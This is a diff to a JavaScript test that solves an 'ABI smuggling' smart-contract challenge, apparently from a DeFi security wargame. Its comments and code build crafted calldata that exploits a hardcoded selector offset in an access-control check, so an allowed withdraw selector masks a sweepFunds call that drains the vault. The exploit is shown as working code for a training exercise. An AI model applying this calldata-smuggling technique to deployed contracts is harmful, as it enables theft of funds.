@@ -48,7 +48,25 @@ describe('[Challenge] ABI smuggling', function () {
      * Exploit overview
      * 
      * The exploit in this challenge is this little bit of code here is when
-     * the AuthorizedExecutor retrieves the selector from the actionData parameter
+     * the AuthorizedExecutor retrieves the selector from the actionData
+     * parameter. Because it is using a hardcoded calldata offset and the 
+     * actionData parameter is a dynamic type of bytes, we can change the offset
+     * of the actionData parameter to be further along the calldata and put the
+     * dummy funcsig in it's place.
+     * 
+     * We can pass the check and still call any function with any data.
+     * 
+     * Essentially our calldata will look like
+     * 
+     * 0x00: execute() funcsig
+     * 0x04: address of vault
+     * 0x24: actionData offset (we manipulate this)
+     * 0x44: Empty bytes (this is where actionData length should be) 
+     * 0x64: withdrawFunds() funcsig (this is where selector is read from)
+     * 0x84: actionData length (new offset will point to this address)
+     * 0xA4: sweepFunds() funcsig 
+     * 0xA8: recovery address
+     * 0xC8: token address
      * 
      */
     it('Execution', async function () {
@@ -59,40 +77,31 @@ describe('[Challenge] ABI smuggling', function () {
         //  Player can withdraw
         expect(vault.interface.getSighash("withdraw"), "0xd9caed12");
 
+        // Connect to challenge contracts
        const attackVault = await vault.connect(player);
        const attackToken = await token.connect(player);
-       
-        /**
-         * Addresses of calldata for exploit
-         * 
-         * Function Selector: 0x00 
-         * Target: 0x04
-         * Bytes Location: 0x24
-         * Null Byte: 0x44
-         * FS Fake: 0x64
-         * Bytes Length: 0x84
-         * FS real: 0xA4
-         * actualdata: 0xA8
-         */
 
+        // Create components of calldata
 
         const executeFs = vault.interface.getSighash("execute")
         const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
-        const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); // address of actual data
+        // Modified offset to be 4 * 32 bytes from after the funcsig
+        const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); 
+        const withdrawSelector =  vault.interface.getSighash("withdraw").slice(2);
+        // Length of actionData calldata (1 * 4) + (2 * 32) Bytes
         const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)
-        const fnSelectorFake =  "0xd9caed12".slice(2);
-        const fnSelectorReal = "0x85fb709d".slice(2);
-        const fnData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)
+        const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);
+        const sweepFundsData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)
                      + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
 
         const payload = executeFs + 
                         target + 
                         bytesLocation + 
                         ethers.utils.hexZeroPad("0x0", 32).slice(2) +
-                        fnSelectorFake + ethers.utils.hexZeroPad("0x0", 28).slice(2) +
+                        withdrawSelector + ethers.utils.hexZeroPad("0x0", 28).slice(2) +
                         bytesLength + 
-                        fnSelectorReal + 
-                        fnData 
+                        sweepSelector + 
+                        sweepFundsData 
         
         console.log("Payload:")
         console.log(payload);
@@ -101,7 +110,6 @@ describe('[Challenge] ABI smuggling', function () {
             {
                 to: attackVault.address,
                 data: payload,
-                gasLimit: 1e6
             }
         )
         
